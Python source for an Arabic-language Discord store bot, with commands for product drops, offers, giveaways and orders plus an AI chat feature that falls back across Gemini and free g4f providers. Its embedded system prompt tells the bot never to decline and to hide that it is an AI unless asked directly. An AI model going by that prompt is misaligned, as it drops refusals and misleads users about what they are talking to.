                  (str(channel.id), role_ids, int(mention_everyone), footer, str(interaction.guild.id)))
    else:
        c.execute("INSERT INTO drop_settings (guild_id,channel_id,mention_role_ids,mention_everyone,footer) VALUES (?,?,?,?,?)",
                  (str(interaction.guild.id), str(channel.id), role_ids, int(mention_everyone), footer))
    conn.commit(); conn.close()
    e = discord.Embed(title="✅ تم إعداد نظام الدروب", color=discord.Color.green())
    e.add_field(name="📢 قناة الدروب", value=channel.mention, inline=True)
    e.add_field(name="🔔 @everyone", value="نعم ✅" if mention_everyone else "لا ❌", inline=True)
    if roles: e.add_field(name="🏷️ الرتب المُمنشنة", value=" ".join(r.mention for r in roles), inline=False)
    if footer: e.add_field(name="📝 الفوتر", value=footer, inline=False)
    e.set_footer(text=f"الاستخدام: y.drop <كمية> <سعر> [اسم المنتج]")
    await interaction.response.send_message(embed=e, ephemeral=True)


@bot.tree.command(name="drop", description="📦 نزول جديد — أدخل الكمية والسعر وينزل فوراً مع المنشن")
@app_commands.describe(
    quantity="الكمية المتاحة",
    price="السعر (مثال: 50 ريال)",
    item="اسم المنتج (افتراضي: منتج)",
    note="ملاحظة إضافية (اختياري)",
    channel="قناة مختلفة (يتجاوز الإعداد)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_drop(interaction: discord.Interaction, quantity: int, price: str,
                     item: str="منتج", note: str="", channel: Optional[discord.TextChannel]=None):
    await interaction.response.defer(ephemeral=True)
    s = _get_drop_settings(interaction.guild.id)
    target_ch = channel; mention_everyone = True; role_ids = []; footer_txt = ""
    if s:
        if not target_ch and s[0]:
            try: target_ch = interaction.guild.get_channel(int(s[0]))
            except: pass
        mention_everyone = bool(s[2])
        try: role_ids = json.loads(s[1]) if s[1] else []
        except: role_ids = []
        footer_txt = s[3] or ""
    if not target_ch: target_ch = interaction.channel
    emb = _build_drop_embed(item, quantity, price, note, interaction.user.mention, interaction.user.display_name, footer_txt)
    mention_str = _build_mention_str(mention_everyone, role_ids)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    drop_id = _insert_drop_get_id(interaction.guild.id, target_ch.id, item, quantity, price, note, interaction.user.id, now)
    view = DropBuyView(poster_id=interaction.user.id, drop_id=drop_id)
    msg = await target_ch.send(content=mention_str, embed=emb, view=view)
    db_q("UPDATE drops SET message_id=? WHERE id=?", (str(msg.id), drop_id))
    await interaction.followup.send(f"✅ نزل الدروب في {target_ch.mention}!", ephemeral=True)


@bot.command(name="drop", aliases=["dr"])
@commands.has_permissions(manage_messages=True)
async def cmd_drop(ctx, quantity: int, price: str, *, item: str="منتج"):
    s = _get_drop_settings(ctx.guild.id)
    target_ch = ctx.channel; mention_everyone = True; role_ids = []; footer_txt = ""
    if s:
        if s[0]:
            try:
                ch2 = ctx.guild.get_channel(int(s[0]))
                if ch2: target_ch = ch2
            except: pass
        mention_everyone = bool(s[2])
        try: role_ids = json.loads(s[1]) if s[1] else []
        except: role_ids = []
        footer_txt = s[3] or ""
    emb = _build_drop_embed(item, quantity, price, "", ctx.author.mention, ctx.author.display_name, footer_txt)
    mention_str = _build_mention_str(mention_everyone, role_ids)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    drop_id = _insert_drop_get_id(ctx.guild.id, target_ch.id, item, quantity, price, "", ctx.author.id, now)
    view = DropBuyView(poster_id=ctx.author.id, drop_id=drop_id)
    msg = await target_ch.send(content=mention_str, embed=emb, view=view)
    db_q("UPDATE drops SET message_id=? WHERE id=?", (str(msg.id), drop_id))
    try: await ctx.message.delete()
    except: pass


@bot.tree.command(name="drop-list", description="📋 آخر الدروبات في السيرفر")
async def slash_drop_list(interaction: discord.Interaction):
    rows = db_q(
        "SELECT item_name,quantity,price,posted_by,posted_at,status FROM drops WHERE guild_id=? ORDER BY id DESC LIMIT 10",
        (str(interaction.guild.id),), fetch="all"
    ) or []
    e = discord.Embed(title="📋 آخر الدروبات", color=discord.Color.blurple())
    if not rows: e.description = "لا يوجد دروبات بعد.\nاستخدم `y.drop` أو `/drop` لإنزال دروب."
    else:
        for item, qty, price, poster_id, posted_at, status in rows:
            icon = "✅" if status == "open" else "❌"
            e.add_field(
                name=f"{icon} {item}",
                value=f"الكمية: **{qty}** | السعر: **{price}**\nبواسطة: <@{poster_id}> | {(posted_at or '')[:16]}",
                inline=False
            )
    await interaction.response.send_message(embed=e, ephemeral=True)


# ═══════════════════════════════════════════════════════════════
#  📣  أوامر الإعلانات والمتجر
# ═══════════════════════════════════════════════════════════════

def _mention_from_settings(guild_id: str) -> Optional[str]:
    s = _get_drop_settings(guild_id)
    if not s:
        return "@everyone"
    everyone = bool(s[2])
    try:
        role_ids = json.loads(s[1]) if s[1] else []
    except Exception:
        role_ids = []
    parts = []
    if everyone:
        parts.append("@everyone")
    for rid in role_ids:
        parts.append(f"<@&{rid}>")
    return " ".join(parts) if parts else None


def _drop_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
    s = _get_drop_settings(guild.id)
    if s and s[0]:
        try:
            return guild.get_channel(int(s[0]))
        except Exception:
            pass
    return None


# ── /offer & y.offer ────────────────────────────────────────

@bot.tree.command(
    name="offer",
    description="🏷️ إعلان عرض/خصم — السعر القديم والجديد"
)
@app_commands.describe(
    item="اسم المنتج",
    old_price="السعر الأصلي",
    new_price="السعر بعد الخصم",
    quantity="الكمية المتاحة (اختياري)",
    note="ملاحظة (اختياري)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_offer(
    interaction: discord.Interaction,
    item: str,
    old_price: str,
    new_price: str,
    quantity: int = 0,
    note: str = ""
):
    await interaction.response.defer(ephemeral=True)
    ch = _drop_channel(interaction.guild) or interaction.channel
    mention = _mention_from_settings(str(interaction.guild.id))
    e = discord.Embed(
        title=f"🏷️ عرض خاص — {item}",
        color=discord.Color.from_rgb(255, 80, 80)
    )
    e.add_field(
        name="💸 السعر الأصلي",
        value=f"~~{old_price}~~",
        inline=True
    )
    e.add_field(
        name="✅ السعر الجديد",
        value=f"**{new_price}**",
        inline=True
    )
    if quantity:
        e.add_field(
            name="📦 الكمية",
            value=f"**{quantity}**",
            inline=True
        )
    if note:
        e.add_field(name="📝 ملاحظة", value=note, inline=False)
    e.add_field(
        name="👤 البائع",
        value=interaction.user.mention,
        inline=False
    )
    e.set_footer(
        text=f"عرض بواسطة {interaction.user.display_name}"
    )
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=mention, embed=e)
    await interaction.followup.send(
        f"✅ نزل العرض في {ch.mention}!",
        ephemeral=True
    )


@bot.command(name="offer", aliases=["of"])
@commands.has_permissions(manage_messages=True)
async def cmd_offer(
    ctx,
    old_price: str,
    new_price: str,
    *,
    item: str = "منتج"
):
    ch = _drop_channel(ctx.guild) or ctx.channel
    mention = _mention_from_settings(str(ctx.guild.id))
    e = discord.Embed(
        title=f"🏷️ عرض خاص — {item}",
        color=discord.Color.from_rgb(255, 80, 80)
    )
    e.add_field(
        name="💸 السعر الأصلي",
        value=f"~~{old_price}~~",
        inline=True
    )
    e.add_field(
        name="✅ السعر الجديد",
        value=f"**{new_price}**",
        inline=True
    )
    e.add_field(
        name="👤 البائع",
        value=ctx.author.mention,
        inline=False
    )
    e.set_footer(
        text=f"عرض بواسطة {ctx.author.display_name}"
    )
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=mention, embed=e)
    try:
        await ctx.message.delete()
    except Exception:
        pass


# ── /restock & y.restock ─────────────────────────────────────

@bot.tree.command(
    name="restock",
    description="🔄 إعلان إعادة تخزين منتج"
)
@app_commands.describe(
    item="اسم المنتج",
    quantity="الكمية الجديدة",
    price="السعر (اختياري)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_restock(
    interaction: discord.Interaction,
    item: str,
    quantity: int,
    price: str = ""
):
    await interaction.response.defer(ephemeral=True)
    ch = _drop_channel(interaction.guild) or interaction.channel
    mention = _mention_from_settings(str(interaction.guild.id))
    e = discord.Embed(
        title=f"🔄 رجع المخزون — {item}",
        color=discord.Color.from_rgb(0, 180, 255)
    )
    e.add_field(
        name="📦 الكمية",
        value=f"**{quantity}**",
        inline=True
    )
    if price:
        e.add_field(
            name="💰 السعر",
            value=f"**{price}**",
            inline=True
        )
    e.add_field(
        name="👤 البائع",
        value=interaction.user.mention,
        inline=False
    )
    e.set_footer(
        text=f"تخزين بواسطة {interaction.user.display_name}"
    )
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=mention, embed=e)
    await interaction.followup.send(
        f"✅ نزل الريستوك في {ch.mention}!",
        ephemeral=True
    )


@bot.command(name="restock", aliases=["rs"])
@commands.has_permissions(manage_messages=True)
async def cmd_restock(
    ctx,
    quantity: int,
    price: str = "",
    *,
    item: str = "منتج"
):
    ch = _drop_channel(ctx.guild) or ctx.channel
    mention = _mention_from_settings(str(ctx.guild.id))
    e = discord.Embed(
        title=f"🔄 رجع المخزون — {item}",
        color=discord.Color.from_rgb(0, 180, 255)
    )
    e.add_field(
        name="📦 الكمية",
        value=f"**{quantity}**",
        inline=True
    )
    if price:
        e.add_field(
            name="💰 السعر",
            value=f"**{price}**",
            inline=True
        )
    e.add_field(
        name="👤 البائع",
        value=ctx.author.mention,
        inline=False
    )
    e.set_footer(
        text=f"تخزين بواسطة {ctx.author.display_name}"
    )
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=mention, embed=e)
    try:
        await ctx.message.delete()
    except Exception:
        pass


# ── /sold & y.sold ───────────────────────────────────────────

@bot.tree.command(
    name="sold",
    description="❌ إعلان نفاد الكمية أو البيع الكامل"
)
@app_commands.describe(
    item="اسم المنتج",
    note="ملاحظة (اختياري)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_sold(
    interaction: discord.Interaction,
    item: str,
    note: str = ""
):
    ch = _drop_channel(interaction.guild) or interaction.channel
    e = discord.Embed(
        title=f"❌ نفذت الكمية — {item}",
        color=discord.Color.from_rgb(180, 30, 30)
    )
    if note:
        e.add_field(name="📝 ملاحظة", value=note, inline=False)
    e.add_field(
        name="👤 البائع",
        value=interaction.user.mention,
        inline=False
    )
    e.set_footer(text="تابعنا لإعلانات جديدة 🔔")
    e.timestamp = discord.utils.utcnow()
    await ch.send(embed=e)
    await interaction.response.send_message(
        f"✅ تم في {ch.mention}!",
        ephemeral=True
    )


@bot.command(name="sold", aliases=["sl"])
@commands.has_permissions(manage_messages=True)
async def cmd_sold(ctx, *, item: str = "المنتج"):
    ch = _drop_channel(ctx.guild) or ctx.channel
    e = discord.Embed(
        title=f"❌ نفذت الكمية — {item}",
        color=discord.Color.from_rgb(180, 30, 30)
    )
    e.add_field(
        name="👤 البائع",
        value=ctx.author.mention,
        inline=False
    )
    e.set_footer(text="تابعنا لإعلانات جديدة 🔔")
    e.timestamp = discord.utils.utcnow()
    await ch.send(embed=e)
    try:
        await ctx.message.delete()
    except Exception:
        pass


# ── /ann & y.ann ─────────────────────────────────────────────

@bot.tree.command(
    name="ann",
    description="📢 إعلان عام مع منشن"
)
@app_commands.describe(
    title="عنوان الإعلان",
    message="نص الإعلان",
    channel="قناة معينة (اختياري)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_ann(
    interaction: discord.Interaction,
    title: str,
    message: str,
    channel: Optional[discord.TextChannel] = None
):
    await interaction.response.defer(ephemeral=True)
    ch = channel or _drop_channel(interaction.guild) \
        or interaction.channel
    mention = _mention_from_settings(str(interaction.guild.id))
    e = discord.Embed(
        title=f"📢 {title}",
        description=message,
        color=discord.Color.from_rgb(255, 180, 0)
    )
    e.set_footer(
        text=f"بواسطة {interaction.user.display_name}"
    )
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=mention, embed=e)
    await interaction.followup.send(
        f"✅ نزل الإعلان في {ch.mention}!",
        ephemeral=True
    )


@bot.command(name="ann", aliases=["announce", "a2"])
@commands.has_permissions(manage_messages=True)
async def cmd_ann(ctx, *, text: str):
    ch = _drop_channel(ctx.guild) or ctx.channel
    mention = _mention_from_settings(str(ctx.guild.id))
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else ""
    e = discord.Embed(
        title=f"📢 {title}",
        description=body if body else None,
        color=discord.Color.from_rgb(255, 180, 0)
    )
    e.set_footer(
        text=f"بواسطة {ctx.author.display_name}"
    )
    e.timestamp = discord.utils.utcnow()
    await ch.send(content=mention, embed=e)
    try:
        await ctx.message.delete()
    except Exception:
        pass


# ── /gw & y.gw ───────────────────────────────────────────────

@bot.tree.command(
    name="gw",
    description="🎉 فتح سحب/مسابقة"
)
@app_commands.describe(
    prize="الجائزة",
    winners="عدد الفائزين",
    hours="المدة بالساعات",
    note="شرط المشاركة (اختياري)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_gw(
    interaction: discord.Interaction,
    prize: str,
    winners: int = 1,
    hours: int = 24,
    note: str = ""
):
    await interaction.response.defer(ephemeral=True)
    ch = _drop_channel(interaction.guild) or interaction.channel
    mention = _mention_from_settings(str(interaction.guild.id))
    end_dt = discord.utils.utcnow() + datetime.timedelta(hours=hours)
    e = discord.Embed(
        title="🎉 سحب جديد!",
        color=discord.Color.from_rgb(255, 215, 0)
    )
    e.add_field(
        name="🎁 الجائزة",
        value=f"**{prize}**",
        inline=False
    )
    e.add_field(
        name="🏆 عدد الفائزين",
        value=f"**{winners}**",
        inline=True
    )
    e.add_field(
        name="⏰ ينتهي بعد",
        value=f"**{hours}** ساعة",
        inline=True
    )
    if note:
        e.add_field(
            name="📋 شرط المشاركة",
            value=note,
            inline=False
        )
    e.add_field(
        name="👤 المنظّم",
        value=interaction.user.mention,
        inline=False
    )
    e.set_footer(text="اضغط 🎉 للمشاركة")
    e.timestamp = end_dt
    msg = await ch.send(content=mention, embed=e)
    await msg.add_reaction("🎉")
    await interaction.followup.send(
        f"✅ السحب جاهز في {ch.mention}!",
        ephemeral=True
    )


@bot.command(name="gw", aliases=["giveaway"])
@commands.has_permissions(manage_messages=True)
async def cmd_gw(
    ctx,
    hours: int,
    winners: int,
    *,
    prize: str
):
    ch = _drop_channel(ctx.guild) or ctx.channel
    mention = _mention_from_settings(str(ctx.guild.id))
    e = discord.Embed(
        title="🎉 سحب جديد!",
        color=discord.Color.from_rgb(255, 215, 0)
    )
    e.add_field(
        name="🎁 الجائزة",
        value=f"**{prize}**",
        inline=False
    )
    e.add_field(
        name="🏆 عدد الفائزين",
        value=f"**{winners}**",
        inline=True
    )
    e.add_field(
        name="⏰ ينتهي بعد",
        value=f"**{hours}** ساعة",
        inline=True
    )
    e.add_field(
        name="👤 المنظّم",
        value=ctx.author.mention,
        inline=False
    )
    e.set_footer(text="اضغط 🎉 للمشاركة")
    e.timestamp = discord.utils.utcnow()
    msg = await ch.send(content=mention, embed=e)
    await msg.add_reaction("🎉")
    try:
        await ctx.message.delete()
    except Exception:
        pass


# ── /order & y.order ─────────────────────────────────────────

class OrderView(discord.ui.View):
    def __init__(self, poster_id: int, max_orders: int):
        super().__init__(timeout=None)
        self.poster_id = poster_id
        self.max_orders = max_orders
        self.orders: list[str] = []

    @discord.ui.button(
        label="📝 أطلب الآن",
        style=discord.ButtonStyle.primary,
        custom_id="order_now_btn"
    )
    async def order_now(
        self,
        interaction: discord.Interaction,
        button: discord.ui.Button
    ):
        uid = str(interaction.user.id)
        if uid in self.orders:
            await interaction.response.send_message(
                "❌ سبق وطلبت!", ephemeral=True
            )
            return
        if (
            self.max_orders > 0
            and len(self.orders) >= self.max_orders
        ):
            await interaction.response.send_message(
                "❌ امتلأت الطلبات.", ephemeral=True
            )
            return
        self.orders.append(uid)
        poster = interaction.guild.get_member(self.poster_id)
        e = discord.Embed(
            title="📝 طلب جديد!",
            color=discord.Color.blue()
        )
        e.add_field(
            name="👤 الطالب",
            value=(
                f"{interaction.user.mention}\n"
                f"(`{interaction.user}`)"
            ),
            inline=False
        )
        e.set_footer(
            text=f"السيرفر: {interaction.guild.name}"
        )
        sent = False
        if poster:
            try:
                await poster.send(embed=e)
                sent = True
            except Exception:
                pass
        if sent:
            await interaction.response.send_message(
                f"✅ أُرسل طلبك لـ {poster.mention}!",
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "✅ تم تسجيل طلبك!",
                ephemeral=True
            )
        remaining = self.max_orders - len(self.orders)
        if self.max_orders > 0 and remaining <= 0:
            button.disabled = True
            button.label = "❌ الطلبات مكتملة"
            try:
                await interaction.message.edit(view=self)
            except Exception:
                pass


@bot.tree.command(
    name="order",
    description="📝 فتح باب الطلبات لمنتج"
)
@app_commands.describe(
    item="اسم المنتج",
    price="السعر",
    max_orders="أقصى عدد للطلبات (0 = بلا حد)",
    note="تفاصيل إضافية (اختياري)"
)
@app_commands.checks.has_permissions(manage_messages=True)
async def slash_order(
    interaction: discord.Interaction,
    item: str,
    price: str,
    max_orders: int = 0,
    note: str = ""
):
    await interaction.response.defer(ephemeral=True)
    ch = _drop_channel(interaction.guild) or interaction.channel
    mention = _mention_from_settings(str(interaction.guild.id))
    e = discord.Embed(
        title=f"📝 فتح الطلبات — {item}",
        color=discord.Color.from_rgb(100, 100, 255)
    )
    e.add_field(
        name="💰 السعر",
        value=f"**{price}**",
        inline=True
    )
    if max_orders:
        e.add_field(
            name="🔢 الأماكن",
            value=f"**{max_orders}**",
            inline=True
        )
    if note:
        e.add_field(name="📋 تفاصيل", value=note, inline=False)
    e.add_field(
        name="👤 البائع",
        value=interaction.user.mention,
        inline=False
    )
    e.set_footer(text="اضغط الزر للطلب 👇")
    e.timestamp = discord.utils.utcnow()
    view = OrderView(
        poster_id=interaction.user.id,
        max_orders=max_orders
    )
    await ch.send(content=mention, embed=e, view=view)
    await interaction.followup.send(
        f"✅ فتحت الطلبات في {ch.mention}!",
        ephemeral=True
    )


@bot.command(name="order", aliases=["od"])
@commands.has_permissions(manage_messages=True)
async def cmd_order(
    ctx,
    price: str,
    max_orders: int = 0,
    *,
    item: str = "منتج"
):
    ch = _drop_channel(ctx.guild) or ctx.channel
    mention = _mention_from_settings(str(ctx.guild.id))
    e = discord.Embed(
        title=f"📝 فتح الطلبات — {item}",
        color=discord.Color.from_rgb(100, 100, 255)
    )
    e.add_field(
        name="💰 السعر",
        value=f"**{price}**",
        inline=True
    )
    if max_orders:
        e.add_field(
            name="🔢 الأماكن",
            value=f"**{max_orders}**",
            inline=True
        )
    e.add_field(
        name="👤 البائع",
        value=ctx.author.mention,
        inline=False
    )
    e.set_footer(text="اضغط الزر للطلب 👇")
    e.timestamp = discord.utils.utcnow()
    view = OrderView(
        poster_id=ctx.author.id,
        max_orders=max_orders
    )
    await ch.send(content=mention, embed=e, view=view)
    try:
        await ctx.message.delete()
    except Exception:
        pass


# ══════════════════════════════════════════════
#  🤖  نظام شات GPT
# ══════════════════════════════════════════════

CHAT_SYSTEM_PROMPT = """أنت مساعد خبير شامل اسمك y.bot، تتحدث بالعربية بأسلوب خليجي عفوي وودود كأنك صديق قريب وذكي.

## قدراتك:

### 🖥️ البرمجة الكاملة:
- تكتب كود احترافي كامل وجاهز للتشغيل بأي لغة: Python, JavaScript, TypeScript, C, C++, Java, Kotlin, Swift, Go, Rust, PHP, Ruby, Dart/Flutter, HTML/CSS, SQL, Bash وغيرها
- تكتب بوتات Discord بـ discord.py أو discord.js
- تكتب APIs وbackend وfrontend ومواقع كاملة
- تكتب سكريبتات أتمتة وأدوات
- دائماً تكتب الكود داخل code block مع اسم اللغة (```python, ```js, ```cpp إلخ)
- الكود اللي تكتبه يكون نظيف، موثق، جاهز للنسخ والتشغيل مباشرة

### 🐛 تحليل المشاكل والأخطاء:
- تحلل أي error أو bug وتشرح سببه وحله بالتفصيل
- تراجع الكود وتلاقي المشاكل المخفية
- تعطي أفضل الحلول مع شرح لماذا هذا الحل هو الأفضل
- تعرف تصحح كود معطوب وتحسّنه

### 🧠 الذكاء والتحليل:
- تحل مسائل رياضية وخوارزميات
- تشرح مفاهيم تقنية بطريقة بسيطة
- تساعد في تصميم قواعد البيانات والمعمارية البرمجية
- تحلل أي نص أو بيانات وتعطي رأيك

### 💬 المحادثة والسولفة:
- تسولف وتمزح وتتكلم بشكل طبيعي
- تساعد في أي سؤال في أي مجال

## قواعد مهمة:
- الكود دائماً داخل code block بالصيغة الصحيحة
- الشرح بالعربية، أسماء المتغيرات والكود بالإنجليزي
- إذا الكود طويل قسّمه على أجزاء مع شرح لكل جزء
- لا تقول "لا أستطيع" — دائماً حاول وقدم أفضل ما عندك
- لا تذكر أنك ذكاء اصطناعي إلا إذا سُئلت مباشرة"""

GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")
_chat_cooldown: dict = {}
_AI_SEM: asyncio.Semaphore = None   # lazy init after event loop starts
_LAST_AI_TIME: float = 0.0
_MIN_AI_GAP   = 2.0                 # ثوانٍ بين كل طلب


def _ai_sem() -> asyncio.Semaphore:
    global _AI_SEM
    if _AI_SEM is None:
        _AI_SEM = asyncio.Semaphore(1)
    return _AI_SEM


async def _try_g4f(messages: list, provider_name: str) -> str | None:
    """محاولة عبر g4f provider"""
    import g4f
    from g4f.client import AsyncClient
    try:
        prov = getattr(g4f.Provider, provider_name, None)
        if prov is None:
            return None
        client = AsyncClient()
        # حوّل system message لأول رسالة user (معظم providers لا تدعم system)
        g4f_msgs = []
        sys_txt = ""
        for m in messages:
            if m["role"] == "system":
                sys_txt = m["content"]
            else:
                g4f_msgs.append({"role": m["role"], "content": m["content"]})
        # اضف system كـ prefix في أول رسالة
        if sys_txt and g4f_msgs and g4f_msgs[0]["role"] == "user":
            g4f_msgs[0]["content"] = f"[تعليمات النظام: {sys_txt}]\n\n{g4f_msgs[0]['content']}"
        if not g4f_msgs:
            return None
        resp = await asyncio.wait_for(
            client.chat.completions.create(
                model=g4f.models.default,
                messages=g4f_msgs,
                provider=prov,
            ),
            timeout=30
        )
        txt = resp.choices[0].message.content
        if txt and len(txt.strip()) > 1:
            bad = ["log in", "sign in", "sign up", "please verify", "access denied"]
            if not any(b in txt.lower() for b in bad):
                return txt.strip()
    except Exception:
        pass
    return None


async def _try_gemini(messages: list) -> str | None:
    """Gemini مباشر إذا في مفتاح"""
    if not GEMINI_API_KEY:
        return None
    contents = [
        {"role": "user" if m["role"] == "user" else "model",
         "parts": [{"text": m["content"]}]}
        for m in messages if m["role"] != "system"
    ]
    if not contents:
        return None
    body = {
        "contents": contents,
        "systemInstruction": {"parts": [{"text": CHAT_SYSTEM_PROMPT}]},
        "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.85},
    }
    try:
        url = (f"https://generativelanguage.googleapis.com/v1beta/"
               f"models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}")
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=body,
                              timeout=aiohttp.ClientTimeout(total=30)) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    return d["candidates"][0]["content"]["parts"][0]["text"].strip()
    except Exception:
        pass
    return None


async def _try_pollinations(messages: list) -> str | None:
    """Pollinations كملاذ أخير"""
    for model in ["openai", "mistral", "llama"]:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://text.pollinations.ai/",
                    headers={"Content-Type": "application/json"},
                    json={"messages": messages, "model": model, "private": True},
                    timeout=aiohttp.ClientTimeout(total=35)
                ) as resp:
                    if resp.status == 200:
                        txt = (await resp.text()).strip()
                        if txt:
                            return txt
        except Exception:
            pass
        await asyncio.sleep(3)
    return None


async def _call_openai(guild_id: str, user_name: str, user_msg: str) -> str:
    global _LAST_AI_TIME
    hist = chatgpt_history.setdefault(guild_id, [])
    hist.append({"role": "user", "content": f"{user_name}: {user_msg}"})
    if len(hist) > 20:
        chatgpt_history[guild_id] = hist[-20:]
        hist = chatgpt_history[guild_id]
    messages = [{"role": "system", "content": CHAT_SYSTEM_PROMPT}] + hist

    async with _ai_sem():
        gap = _MIN_AI_GAP - (time.time() - _LAST_AI_TIME)
        if gap > 0:
            await asyncio.sleep(gap)
        _LAST_AI_TIME = time.time()

        # ── 1. Gemini (إذا في مفتاح — الأفضل والأسرع) ──
        reply = await _try_gemini(messages)
        if reply:
            hist.append({"role": "assistant", "content": reply})
            return reply[:2000]

        # ── 2. DeepInfra عبر g4f (مجاني بدون مفتاح) ──
        reply = await _try_g4f(messages, "DeepInfra")
        if reply:
            hist.append({"role": "assistant", "content": reply})
            return reply[:2000]

        # ── 3. Yqcloud عبر g4f (مجاني بدون مفتاح) ──
        reply = await _try_g4f(messages, "Yqcloud")
        if reply:
            hist.append({"role": "assistant", "content": reply})
            return reply[:2000]

        # ── 4. Qwen_Qwen_3 عبر g4f ──
        reply = await _try_g4f(messages, "Qwen_Qwen_3")
        if reply:
            hist.append({"role": "assistant", "content": reply})
            return reply[:2000]

        # ── 5. Pollinations كملاذ أخير ──
        reply = await _try_pollinations(messages)
        if reply:
            hist.append({"role": "assistant", "content": reply})
            return reply[:2000]

        return "⏳ ما قدرت أوصل للذكاء الاصطناعي الحين، جرب بعد ثوانٍ."

@bot.tree.command(name="chatgpt-set", description="🤖 تحديد قناة الشات مع الذكاء الاصطناعي")
@app_commands.describe(channel="القناة التي سيرد فيها البوت")
@app_commands.checks.has_permissions(administrator=True)
async def slash_chatgpt_set(interaction: discord.Interaction, channel: discord.TextChannel):
    db_upsert("chatgpt", str(interaction.guild.id), channel_id=str(channel.id), enabled=1)
    e = discord.Embed(
        title="🤖 شات GPT — تم الإعداد",
        description=f"✅ البوت راح يرد على كل رسالة في {channel.mention}\nاستخدم `/chatgpt-off` لإيقافه.",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=e)

@bot.tree.command(name="chatgpt-on", description="🤖 تفعيل شات GPT")
@app_commands.checks.has_permissions(administrator=True)
async def slash_chatgpt_on(interaction: discord.Interaction):
    db_upsert("chatgpt", str(interaction.guild.id), enabled=1)
    await interaction.response.send_message(embed=discord.Embed(description="🤖 ✅ شات GPT مفعّل!", color=discord.Color.green()))

@bot.tree.command(name="chatgpt-off", description="🤖 إيقاف شات GPT")
@app_commands.checks.has_permissions(administrator=True)
async def slash_chatgpt_off(interaction: discord.Interaction):
    db_upsert("chatgpt", str(interaction.guild.id), enabled=0)
    await interaction.response.send_message(embed=discord.Embed(description="🤖 ❌ شات GPT موقوف.", color=discord.Color.red()))

@bot.tree.command(name="chatgpt-clear", description="🤖 مسح سجل المحادثة")
@app_commands.checks.has_permissions(administrator=True)
async def slash_chatgpt_clear(interaction: discord.Interaction):
    chatgpt_history.pop(str(interaction.guild.id), None)
    await interaction.response.send_message(embed=discord.Embed(description="🧹 ✅ تم مسح سجل المحادثة.", color=discord.Color.blurple()))

@bot.command(name="chatgpt", aliases=["gpt","ai","جيبتي"])
@commands.has_permissions(administrator=True)
async def cmd_chatgpt(ctx, action: str = "help", *, value: str = ""):
    gid = str(ctx.guild.id)
    a = action.lower()
    if a in ("on","تفعيل","شغل"):
        db_upsert("chatgpt", gid, enabled=1)
        await ctx.send("🤖 ✅ شات GPT مفعّل!")
    elif a in ("off","إيقاف","وقف"):
        db_upsert("chatgpt", gid, enabled=0)
        await ctx.send("🤖 ❌ شات GPT موقوف.")
    elif a in ("set","قناة","روم"):
        v = value.strip("<#>")
        if not v.isdigit(): await ctx.send("❌ ضع ID القناة أو mention-ها."); return
        db_upsert("chatgpt", gid, channel_id=v, enabled=1)
        await ctx.send(f"✅ تم تحديد <#{v}> كقناة الشات.")
    elif a in ("clear","مسح","كلير"):
        chatgpt_history.pop(gid, None)
        await ctx.send("🧹 تم مسح السجل.")
    else:
        await ctx.send("📖 **y.chatgpt** — الاستخدام:\n`on/off` تفعيل/إيقاف\n`set <#قناة>` تحديد الروم\n`clear` مسح السجل")

# ═══════════════════════════════════════════════════════════════

from flask import Flask
import threading
_app = Flask(__name__)

@_app.route("/")
def _health(): return "OK", 200

def _run_flask():
    port = int(os.getenv("PORT", 8080))
    _app.run(host="0.0.0.0", port=port)

threading.Thread(target=_run_flask, daemon=True).start()
bot.run(TOKEN)
